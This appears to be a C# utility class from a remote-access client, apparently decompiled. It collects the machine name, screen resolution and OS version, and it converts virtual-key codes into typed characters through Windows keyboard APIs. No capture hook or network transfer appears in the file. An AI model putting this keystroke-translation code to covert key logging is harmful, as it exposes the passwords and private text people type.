using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RemoteClient.Remote
{
    internal static class Utils
	{
		private static Random rd = new Random();
		private static string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		private static string digits = "0123456789";
		private static bool bool_0 = false;
		internal static Dictionary<byte, byte> dictionary_0 = new Dictionary<byte, byte>();
		internal static Info GetScreen()
        {
			var computerName = Environment.MachineName;
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			OperatingSystem os = Environment.OSVersion;
			Info vscreen = new Info
			{
				ComputerName = computerName,
				Width = width,
				Height = height,
				MajorVersion = os.Version.Major.ToString(),
				MinorVersion = os.Version.Minor.ToString()
			};
			return vscreen;
		}
		internal static string DataStringBuilder(string[] data)
        {
			StringBuilder stringBuilder = new StringBuilder();
			for(int i=0; i< data.Length; i++)
            {
				stringBuilder.Append(data[i]);
				if(i != data.Length - 1)
                {
					stringBuilder.Append("|");
                }
            }
			return stringBuilder.ToString();
        }
		internal static string RandomStringNumber(int length)
		{
			StringBuilder result = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				int index = rd.Next(digits.Length);
				result.Append(digits[index]);
			}
			return result.ToString();
		}
		internal static string RandomString(int length)
		{
			StringBuilder result = new StringBuilder();
			for(int i =0; i < length; i++)
            {
				int index = rd.Next(chars.Length);
				result.Append(chars[index]);
			}
			return result.ToString();
		}
		internal static int smethod_16(int wParam, int lParam)
		{
			int result = wParam;
			checked
			{
				uint num = (uint)((lParam & 16711680) >> 16);
				bool expression = (lParam & 16777216) != 0;
				switch (wParam)
				{
					case 16:
						result = MapVirtualKeyA((int)num, 3);
						break;
					case 17:
						result = (expression) ? 163 : 162;
						break;
					case 18:
						result = (expression) ? 165 : 164;
						break;
				}
				return result;
			}
		}
		internal static string smethod_19(uint uint_0, IntPtr intptr_1 = default(IntPtr), int int_10 = 0)
		{
			checked
			{
				string result;
				if (int_10 != 256)
				{
					result = "";
				}
				else if (dictionary_0.ContainsKey((byte)uint_0))
				{
					if (bool_0)
					{
						bool_0 = false;
					}
					else
					{
						bool_0 = true;
					}
					result = "{dk}";
				}
				else
				{
					byte[] byte_ = new byte[255];
					if (!GetKeyboardState(byte_))
					{
						result = "";
					}
					else
					{
						uint uint_ = (uint)MapVirtualKeyA((int)uint_0, 0);
						if (intptr_1 == (IntPtr)0)
						{
							 //intptr_1 = Class62.smethod_1();
						}
						IntPtr intptr_2 = intptr_1;
						StringBuilder stringBuilder = new StringBuilder();
						if (ToUnicodeEx(uint_0, uint_, byte_, stringBuilder, 5, 0U, intptr_2) == 1 && bool_0)
						{
							bool_0 = false;
							result = "{dk}";
						}
						else
						{
							result = stringBuilder.ToString();
						}
					}
				}
				return result;
			}
		}
		[DllImport("user32.dll")]
		private static extern bool GetKeyboardState(byte[] byte_0);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int MapVirtualKeyA(int int_10, int int_11);
		[DllImport("user32.dll")]
		private static extern int ToUnicodeEx(uint uint_0, uint uint_1, byte[] byte_0, [MarshalAs(UnmanagedType.LPWStr)][Out] StringBuilder stringBuilder_0, int int_10, uint uint_2, IntPtr intptr_1);
	}
}
